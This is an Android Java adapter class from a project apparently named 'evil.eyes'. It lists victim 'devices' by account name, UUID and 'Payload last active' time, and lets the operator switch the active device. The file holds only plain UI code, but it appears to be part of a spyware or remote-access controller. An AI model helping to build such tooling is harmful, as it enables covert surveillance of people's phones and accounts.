package evil.eyes.core.adapters;

import android.app.AlertDialog;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.Filter;
import android.widget.Filterable;
import android.widget.TextView;

import androidx.annotation.NonNull;
import androidx.appcompat.widget.AppCompatButton;
import androidx.recyclerview.widget.RecyclerView;

import java.util.List;

import evil.eyes.MainActivity;
import evil.eyes.R;
import evil.eyes.core.DeviceConfig;
import evil.eyes.core.interfaces.onRestart;
import evil.eyes.core.models.Devices;
import evil.eyes.core.utils.TimeUtils;
import evil.eyes.ui.Home;

public class DeviceViwer extends RecyclerView.Adapter<DeviceViwer.ViewHolder> implements Filterable {

    List<Devices> data;

    public DeviceViwer(List<Devices> data) {
        this.data = data;
    }

    @NonNull
    @Override
    public ViewHolder onCreateViewHolder(@NonNull ViewGroup parent, int viewType) {
        return new ViewHolder(LayoutInflater.from(parent.getContext()).inflate(R.layout.device_list_holder, parent, false));
    }

    @Override
    public void onBindViewHolder(@NonNull ViewHolder holder, int position) {
        Devices device = data.get(position);

        holder.name.setText("Name: "+device.getPrimaryAccountName());
        holder.uuid.setText("UUID: "+device.getUUID());
        holder.time.setText("Payload last active: "+ TimeUtils.getTimeFromTimeStamp(device.getLastStartedTime()));
    }

    @Override
    public int getItemCount() {
        if (data != null) return data.size(); else return 0;
    }

    @Override
    public Filter getFilter() {
        return null;
    }

     class ViewHolder extends RecyclerView.ViewHolder implements View.OnClickListener {

        private TextView name, uuid, time;
        private AppCompatButton action;
        public ViewHolder(@NonNull View itemView) {
            super(itemView);

            name = itemView.findViewById(R.id.name);
            uuid = itemView.findViewById(R.id.uuid);
            time = itemView.findViewById(R.id.lastActive);
            action = itemView.findViewById(R.id.action);
            action.setOnClickListener(this);
        }

        @Override
        public void onClick(View v) {
            new AlertDialog.Builder(action.getContext())
                    .setMessage("Are you sure you want to change the active device ? This action requires a immediate restart for the changes to take affect !!")
                    .setCancelable(true)
                    .setTitle("Change to "+data.get(getAdapterPosition()).getUUID())
                    .setNegativeButton("NO",(r,s) -> r.dismiss())
                    .setPositiveButton("CHANGE", (view,d) -> {
                        DeviceConfig
                            .getInstance(v.getContext())
                            .initializeStorage()
                            .setCurrentDevice(data.get(getAdapterPosition()));
                        Home.onRestart.onRestartRequested();
                    })
                    .show();

        }
    }

}
